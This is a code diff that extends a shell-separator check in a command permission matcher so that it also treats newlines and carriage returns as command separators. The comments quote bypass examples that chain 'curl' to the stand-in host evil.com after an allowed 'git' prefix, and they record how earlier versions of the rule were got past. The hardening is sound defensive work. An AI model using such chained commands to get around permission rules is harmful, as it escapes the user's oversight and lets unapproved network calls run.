@@ -111,16 +111,23 @@ type CompiledMatcher = {
 
 /**
  * Quote-aware check for shell command-chaining metacharacters
- * (`;`, `&`, `|`, `<`, `>`, backticks). Returns true if any of those
- * appears OUTSIDE a quoted span — i.e. would actually be interpreted
- * by bash as starting another command / redirecting / substituting.
- * Inside `"…"` / `'…'` they are literal text.
+ * (`;`, `&`, `|`, `<`, `>`, backticks, AND newlines/carriage returns).
+ * Returns true if any of those appears OUTSIDE a quoted span — i.e.
+ * would actually be interpreted by bash as starting another command,
+ * redirecting, or substituting. Inside `"…"` / `'…'` they are literal
+ * text.
+ *
+ * Newlines (`\n`/`\r`) count too because bash treats them as command
+ * separators equivalent to `;`. Pre-fix the scan accepted multi-line
+ * input through prefix rules — `git:*` matched `git status\ncurl
+ * https://evil.com` because the post-prefix `\n` passed the `\s`
+ * boundary check and the rest of the command had no other separator
+ * chars (Codex P1 round-3).
  *
  * Used by prefix `:*` patterns to refuse any match on commands that
  * contain chaining, so an allow rule like `git:*` doesn't
- * accidentally authorize `git status; curl evil.com` — the prefix
- * matches the first token but bash still runs the trailing command
- * (Codex P1 round-2 bypass).
+ * accidentally authorize chained or multi-line payloads — the prefix
+ * matches the first token but bash still runs the trailing command.
  */
 function containsShellSeparator(command: string): boolean {
   let quote: '"' | '\'' | '`' | undefined;
@@ -149,7 +156,9 @@ function containsShellSeparator(command: string): boolean {
       char === '|' ||
       char === '<' ||
       char === '>' ||
-      char === '`'
+      char === '`' ||
+      char === '\n' ||
+      char === '\r'
     ) {
       return true;
     }
